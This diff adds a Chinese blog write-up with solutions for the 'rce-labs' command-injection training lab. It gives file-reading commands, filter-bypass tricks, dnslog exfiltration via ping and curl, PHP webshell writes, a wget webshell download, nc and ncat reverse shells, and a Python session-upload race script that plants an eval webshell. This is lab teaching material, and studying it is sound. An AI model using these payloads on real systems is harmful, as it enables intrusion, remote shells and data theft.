@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - rce-labs writeup</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>rce-labs writeup</h1>
+    <p>
+        <span class="meta">发布于: 2026-03-04 01:13</span>
+    </p>
+    <div class="post-body">
+        <h2>部署</h2>
+<h3>安装docker、docker compose</h3>
+<p>推荐使用项目 <a href="https://github.com/SuperManito/LinuxMirrors">https://github.com/SuperManito/LinuxMirrors</a></p>
+<p>使用 root 权限执行以下命令安装 Docker 和 Docker Compose：</p>
+<p>GNU/Linux 更换系统软件源</p>
+<pre><code class="language-bash">bash &lt;(curl -sSL https://linuxmirrors.cn/main.sh)</code></pre>
+<p>Docker 安装与换源</p>
+<pre><code class="language-bash">bash &lt;(curl -sSL https://linuxmirrors.cn/docker.sh)</code></pre>
+<p>Docker 更换镜像加速器</p>
+<pre><code class="language-bash">bash &lt;(curl -sSL https://linuxmirrors.cn/docker.sh) --only-registry</code></pre>
+<h3>docker compose（推荐）</h3>
+<pre><code class="language-bash">git clone https://hk.gh-proxy.org/https://github.com/Apursuit/rce-labs.git
+cd rce-labs/docker
+docker-compose up -d</code></pre>
+<p>访问 <a href="http://ip:8080/">http://ip:8080/</a></p>
+<h3>docker</h3>
+<pre><code class="language-bash">docker run -d -p 8080:80 --name rce-lab-latest the0n3/rce-labs:latest</code></pre>
+<p>访问 <a href="http://ip:8080/">http://ip:8080/</a></p>
+<h2>写在前面</h2>
+<p>前面关卡，大多是讲解文件读取命令，让一些新人在面对基础的waf时，能够多一个文件读取的思路，后面关卡会逐渐增加一些绕过的难度，建议大家在做题的时候，先自己想一想，如果实在想不出来，可以参考一下 writeup，或者直接看 writeup 来学习一些新的思路和方法。</p>
+<h2>题解</h2>
+<h3>less-1</h3>
+<p>cat 读取文件内容</p>
+<pre><code class="language-bash">cat /flag</code></pre>
+<h3>less-2</h3>
+<p>tac 反向读取文件内容</p>
+<pre><code class="language-bash">tac /flag</code></pre>
+<h3>less-3</h3>
+<p>head 读取文件前 n 行，默认是 10 行，可以通过 -n 参数指定读取的行数</p>
+<pre><code class="language-bash">head -n 20 /flag</code></pre>
+<h3>less-4</h3>
+<p>tail 读取文件后 n 行，默认是 10 行，可以通过 -n 参数指定读取的行数</p>
+<pre><code class="language-bash">tail -n 20 /flag</code></pre>
+<h3>less-5</h3>
+<p>more 读取文件内容，没有固定的默认行数，它的行为取决于终端窗口的大小，默认填满屏幕</p>
+<pre><code class="language-bash">more /flag</code></pre>
+<h3>less-6</h3>
+<p>less 读取文件内容，默认填满屏幕</p>
+<pre><code class="language-bash">less /flag</code></pre>
+<h3>less-7</h3>
+<p>nl 读取文件内容，默认显示行号</p>
+<pre><code class="language-bash">nl /flag</code></pre>
+<h3>less-8</h3>
+<p>sort 读取文件内容，默认按照字典序排序</p>
+<pre><code class="language-bash">sort /flag</code></pre>
+<h3>less-9</h3>
+<p>uniq 读取文件内容，默认去重相邻的重复行</p>
+<pre><code class="language-bash">uniq /flag</code></pre>
+<h3>less-10</h3>
+<p>dd 读取文件内容，默认删除文件内容</p>
+<pre><code class="language-bash">dd if=/flag of=/dev/stdout</code></pre>
+<h3>less-11</h3>
+<p>rev 反转文件内容，再次反转可以得到原内容</p>
+<pre><code class="language-bash">rev /flag | rev</code></pre>
+<h3>less-12</h3>
+<p>od 以八进制、十六进制、十进制等格式输出文件内容，默认以八进制输出</p>
+<pre><code class="language-bash">od -A none -t x1 /flag</code></pre>
+<h3>less-13</h3>
+<p>xxd 以十六进制和 ASCII 格式输出文件内容，默认以十六进制和 ASCII 格式输出</p>
+<pre><code class="language-bash">xxd -p /flag</code></pre>
+<h3>less-14</h3>
+<p>hexdumps 以十六进制和 ASCII 格式输出文件内容，默认以十六进制和 ASCII 格式输出</p>
+<pre><code class="language-bash">hexdump -C /flag</code></pre>
+<h3>less-15</h3>
+<p>base32 以 base32 编码输出文件内容，默认以 base32 编码输出</p>
+<pre><code class="language-bash">base32 /flag</code></pre>
+<h3>less-16</h3>
+<p>base64 以 base64 编码输出文件内容，默认以 base64 编码输出</p>
+<pre><code class="language-bash">base64 /flag | base64 -d</code></pre>
+<h3>less-17</h3>
+<p>strings 以字符串形式输出文件内容，默认以字符串形式输出</p>
+<pre><code class="language-bash">strings /flag</code></pre>
+<h3>less-18</h3>
+<p>grep 以正则表达式匹配文件内容，默认以正则表达式匹配文件内容，使用 . 匹配所有内容</p>
+<pre><code class="language-bash">grep . /flag</code></pre>
+<h3>less-19</h3>
+<p>file 判断文件类型，默认判断文件类型，可以指定文件，判断文件列表里的文件类型，如果文件里的文件名不存在，会报错，从而读取文件内容</p>
+<pre><code class="language-bash">file -f /flag</code></pre>
+<h3>less-20</h3>
+<p>date 以日期格式输出文件内容，默认以日期格式输出，可以指定输入文件，读取文件内容并以日期格式输出</p>
+<pre><code class="language-bash">echo $(date -f /flag 2&gt;&amp;1)</code></pre>
+<h3>less-21</h3>
+<p>diff 以比较文件内容的方式输出文件内容，默认比较两个文件的内容</p>
+<pre><code class="language-bash">diff /flag /etc/passwd</code></pre>
+<h3>less-22</h3>
+<p>find 以查找文件的方式输出文件内容，默认查找当前目录下的文件，这关找到题目指引的 findme.txt即可</p>
+<pre><code class="language-bash">find / -name findme.txt 2&gt;/dev/null</code></pre>
+<h3>less-23</h3>
+<p>cp 复制文件，可以利用 linux 的符号链接机制，复制文件到 /dev/stdout 来输出文件内容</p>
+<pre><code class="language-bash">cp /flag /dev/stdout</code></pre>
+<p>或者把 /flag 复制到 web目录读取</p>
+<pre><code class="language-bash">cp /flag /var/www/html/flag.txt</code></pre>
+<h3>less-24</h3>
+<p>mv 移动或重命名文件，把 /flag 移动到 web目录读取</p>
+<pre><code class="language-bash">mv /flag /var/www/html/flag.txt</code></pre>
+<h3>less-25</h3>
+<p>ping 命令可以发送网络请求，利用这个特性可以把命令执行结果带出到公网</p>
+<p>推荐一个 dnslog 平台 <a href="https://eyes.sh/dns/">https://eyes.sh/dns/</a></p>
+<p>使用浏览器搜索 dnslog，找到一个可用的dnslog 平台，获取一个域名，然后把命令执行结果拼接到这个域名上，发送网络请求</p>
+<p>如果你找不到读取命令了，你可以尝试执行这个flag文件，大概率可能会报错，把报错信息拼接到域名上发送网络请求，读取到文件内容，注意payload要进行url编码</p>
+<pre><code class="language-bash">ping `php /flag 2&gt;&amp;1`.xxx.eyes.sh</code></pre>
+<h3>less-26</h3>
+<p>curl 命令可以发送网络请求，利用这个特性可以把命令执行结果带出到公网</p>
+<pre><code class="language-bash">curl http://xru706nu.eyes.sh -d "data=$(php /flag 2&gt;&amp;1)"</code></pre>
+<p>可以在这个dnslog 平台看到请求</p>
+<pre><code class="language-bash">REQUEST_METHOD: POST
+HTTP_HOST: xxxx.eyes.sh
+HTTP_X_REAL_IP: x.x.x.x
+HTTP_X_FORWARDED_FOR: x.x.x.x
+HTTP_X_FORWARDED_PROTO: http
+HTTP_CONNECTION: close
+CONTENT_LENGTH: 9
+HTTP_USER_AGENT: curl/8.17.0
+HTTP_ACCEPT: */*
+CONTENT_TYPE: application/x-www-form-urlencoded
+
+data=1111</code></pre>
+<h3>less-27</h3>
+<p>echo 输出内容重定向到文件，可以达到写入webshell的目的</p>
+<pre><code class="language-bash">echo "&lt;?=phpinfo();?&gt;" &gt; shell.php
+echo '&lt;?=system($_GET["cmd"]);?&gt;' &gt; shell.php</code></pre>
+<h3>less-28</h3>
+<p>wget 命令可以下载文件，利用这个特性可以把远程的 webshell 下载到本地，达到写入 webshell 的目的</p>
+<pre><code class="language-bash">wget https://the0n3.top/shell/1.txt -O shell.php</code></pre>
+<h3>less-29</h3>
+<p>nc 命令可以发送网络请求，利用这个特性可以把命令执行结果带出到公网，与远程主机建立连接，反弹shell是最常见的用法</p>
+<p>靶机，其中 x.x.x.x 是攻击机的ip，靶机是 alpine，自带的 nc 命令不支持反弹shell，可以使用 busybox 的 nc 命令，busybox 是 alpine 的基础镜像，自带的，同时靶机安装了bash</p>
+<pre><code class="language-bash">busybox nc x.x.x.x 4444 -e bash</code></pre>
+<p>攻击机</p>
+<pre><code class="language-bash">nc -lvnp 4444</code></pre>
+<h3>less-30</h3>
+<p>ncat 反弹shell，ncat 是 nmap 的一个组件，功能类似于 nc，但支持更多的功能和协议，ncat 支持反弹shell，可以使用 ncat 的 -e 参数指定要执行的命令</p>
+<p>但是这关过滤了 nc 关键词，ncat 存在误伤，所以题目要求先往后做，学习绕过后在回来，这里使用简单的绕过演示</p>
+<p>靶机</p>
+<pre><code class="language-bash">n''c''at x.x.x.x 4444 -e /bin/bash</code></pre>
+<p>攻击机</p>
+<pre><code class="language-bash">nc -lvnp 4444</code></pre>
+<h3>less-31</h3>
+<p>sed 命令可以对文本进行处理，可以编辑替换文件内容</p>
+<p>不进行替换，直接把文件内容输出到标准输出</p>
+<pre><code class="language-bash">sed '' /flag</code></pre>
+<p>在开头插入内容</p>
+<ul>
+<li>-i 在开头插入内容</li>
+<li>-ni 在第n行前插入内容</li>
+</ul>
+<pre><code class="language-bash">sed -i '2i phpinfo();' index.php</code></pre>
+<p>在结尾插入内容</p>
+<ul>
+<li>$ 最后一行</li>
+<li>a 追加内容</li>
+</ul>
+<pre><code class="language-bash">sed -i '$a phpinfo();' index.php</code></pre>
+<h3>less-32</h3>
+<p>使用通配符 ? 匹配单个字符</p>
+<pre><code class="language-bash">/bin/ca? /flag</code></pre>
+<h3>less-33</h3>
+<p>使用通配符 * 匹配任意数量的字符</p>
+<pre><code class="language-bash">/bin/m*re /flag</code></pre>
+<h3>less-34</h3>
+<p>使用通配符 [ ] 匹配指定范围内的字符</p>
+<pre><code class="language-bash">/bin/[c][a][t] /flag</code></pre>
+<h3>less-34a</h3>
+<p>通过shell变量拼接，绕过过滤</p>
+<pre><code class="language-bash">a=ca;b=t;c=$a$b;$c /flag</code></pre>
+<h3>less-35</h3>
+<p>linux 使用 ； 分隔多个命令，可以在一行执行多个命令</p>
+<pre><code class="language-bash">;cat /flag</code></pre>
+<h3>less-36</h3>
+<p>linux 使用 &amp;&amp; 分隔多个命令，前一个命令执行成功后才会执行后一个命令，注意在get请求时，&amp; 是特殊字符，需要进行 url 编码，编码后是 %26</p>
+<pre><code class="language-bash">&amp;&amp; cat /flag</code></pre>
+<h3>less-37</h3>
+<p>linux 使用 || 分隔多个命令，前一个命令执行失败后才会执行后一个命令，前面是ls命令，后面拼接一个不存在的目录即可</p>
+<pre><code class="language-bash">111|| cat /flag</code></pre>
+<h3>less-38</h3>
+<p>linux 可以有命令替换语法，使用反引号 ` 或者 $() 来执行命令，并把输出结果替换到命令行中，这个过程发生在变量展开之前，所以可以利用这个特性来绕过一些过滤，执行命令</p>
+<pre><code class="language-bash">`cat /flag` 2&gt;/dev/stdout</code></pre>
+<h3>less-38a</h3>
+<p>同上，使用 $() 来执行命令，并把输出结果替换到命令行中</p>
+<pre><code class="language-bash">$(cat /flag) 2&gt;/dev/stdout</code></pre>
+<h3>less-39</h3>
+<p>绕过注释，linux 的注释符号是 #，在命令行中，# 后面的内容会被当做注释忽略掉，可以换行执行绕过注释的效果，url传入url编码的%0a换行符</p>
+<pre><code class="language-bash">%0acat /flag</code></pre>
+<h3>less-40</h3>
+<p>绕过空格，使用tab键或者其他空白字符来替代空格，url传入url编码的%09制表符</p>
+<pre><code class="language-bash">cat%09/flag</code></pre>
+<h3>less-41</h3>
+<p>绕过空格，使用 $IFS 来替代空格，IFS 是 linux 的内部字段分隔符，默认是空格、制表符和换行符</p>
+<pre><code class="language-bash">cat$IFS/flag</code></pre>
+<h3>less-42</h3>
+<p>绕过空格，使用 ${IFS} 来替代空格，${} 是 linux 的参数扩展语法，可以用来获取变量的值，或者在变量名中使用特殊字符</p>
+<pre><code class="language-bash">cat${IFS}/flag</code></pre>
+<h3>less-43</h3>
+<p>绕过空格，使用 bash 的 {cmd,parm}语法执行命令</p>
+<pre><code class="language-bash">{cat,/flag}</code></pre>
+<h3>less-44</h3>
+<p>绕过黑名单关键词，使用单引号 <code>'</code> 来绕过过滤，在命令里面使用单引号把关键词分隔开来，在变量展开前单引号会被当做普通字符，命令执行时会被去掉</p>
+<pre><code class="language-bash">ca''t /flag</code></pre>
+<h3>less-45</h3>
+<p>双引号同样可以</p>
+<pre><code class="language-bash">ca""t /flag</code></pre>
+<h3>less-46</h3>
+<p>绕过黑名单关键词，使用 <code>?</code> 来绕过过滤，? 是 linux 的通配符，匹配任意单个字符，可以用来替代关键词中的某个字符</p>
+<pre><code class="language-bash">/bin/ca?&lt;/flag</code></pre>
+<h3>less-47</h3>
+<p>绕过黑名单关键词，使用 <code>*</code> 来绕过过滤，* 是 linux 的通配符，匹配任意数量的字符，可以用来替代关键词中的多个字符</p>
+<pre><code class="language-bash">/bin/m*re&lt;/flag</code></pre>
+<h3>less-48</h3>
+<p>绕过黑名单关键词，使用 <code>\</code> 来绕过过滤，\ 是 linux 的转义字符，在变量展开前，\ 后面的字符会被当做普通字符，可以用来分隔关键词中的字符</p>
+<pre><code class="language-bash">/bin/ca\t&lt;/flag</code></pre>
+<h3>less-49</h3>
+<p>绕过黑名单关键词，使用 <code>$@</code> 来绕过过滤，$@ 是 linux 的特殊变量，表示所有位置参数的列表，在变量展开时，$@ 会被替换成所有位置参数的值，可以用来替代关键词中的多个字符</p>
+<pre><code class="language-bash">ca$@t&lt;/flag</code></pre>
+<h3>less-50</h3>
+<p>需要利用php的session临时文件，具体参考 <a href="https://github.com/Apursuit/rce-labs/issues/3">https://github.com/Apursuit/rce-labs/issues/3</a></p>
+<pre><code class="language-python">import io
+import requests
+import threading
+
+url = 'http://192.168.6.100:32769/less-50/'
+sessionid = 'aaa'
+
+def write(session): # 写入临时文件
+    while True:
+        fileBytes = io.BytesIO(b'a'*1024*50) # 50kb
+        session.post(url,
+        cookies = {'PHPSESSID':sessionid},
+        data = {'PHP_SESSION_UPLOAD_PROGRESS':"""
+
+                # php 执行内容
+                # &lt;?php system("echo 'php code&lt;?php highlight_file(__FILE__);eval(\\$_POST[1]);?&gt;' &gt; /var/www/html/less-50/shell.php");?&gt;
+
+                # sh 执行内容
+                echo 'sh code&lt;?php highlight_file(__FILE__);eval($_POST[1]);?&gt;' &gt; /var/www/html/less-50/shell.php
+
+                """},
+        files={'file':('1.jpg',fileBytes)}
+        )
+
+def read(session):
+    while True:
+        # 这里 cmd 解释器还可以换为php，如'?cmd=php&lt;&gt;/tmp/sess_'
+        session.get(url+'?cmd=sh&lt;&gt;/tmp/sess_'+sessionid) # 使用 &lt;&gt; 绕过空格，通过sh或其他解释器执行临时文件内容
+        r = session.get(url+'shell.php') # 检查是否写入一句话木马
+        if r.status_code == 200:
+            print('OK')
+            return ;
+
+evnet=threading.Event() # 多线程
+
+session = requests.session()
+for i in range(10):
+    threading.Thread(target = write,args = (session,)).start()
+for i in range(10):
+    threading.Thread(target = read,args = (session,)).start()
+
+evnet.set()</code></pre>
+<h3>less-52</h3>
+<p>上题脚本稍加修改</p>
+<pre><code class="language-bash">import io
+import requests
+import threading
+
+url = 'http://192.168.6.100:32769/less-52/'
+sessionid = 'aaa'
+
+def write(session): # 写入临时文件
+    while True:
+        fileBytes = io.BytesIO(b'a'*1024*50) # 50kb
+        session.post(url,
+        cookies = {'PHPSESSID':sessionid},
+        data = {'PHP_SESSION_UPLOAD_PROGRESS':"""
+
+                # php 执行内容
+                # &lt;?php system("echo 'php code&lt;?php highlight_file(__FILE__);eval(\\$_POST[1]);?&gt;' &gt; /var/www/html/less-52/shell.php");?&gt;
+
+                # sh 执行内容
+                echo 'sh code&lt;?php highlight_file(__FILE__);eval($_POST[1]);?&gt;' &gt; /var/www/html/less-52/shell.php
+
+                """},
+        files={'file':('1.jpg',fileBytes)}
+        )
+
+def read(session):
+    while True:
+        # 这里 cmd 解释器还可以换为php，如'?cmd=php&lt;&gt;/tmp/sess_'
+        session.get(url+'?cmd=sh&lt;&gt;/tmp/sess_'+sessionid) # 使用 &lt;&gt; 绕过空格，通过sh或其他解释器执行临时文件内容
+        r = session.get(url+'shell.php') # 检查是否写入一句话木马
+        if r.status_code == 200:
+            print('OK')
+            return ;
+
+evnet=threading.Event() # 多线程
+
+session = requests.session()
+for i in range(10):
+    threading.Thread(target = write,args = (session,)).start()
+for i in range(10):
+    threading.Thread(target = read,args = (session,)).start()
+
+evnet.set()</code></pre>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>share</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#rce</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
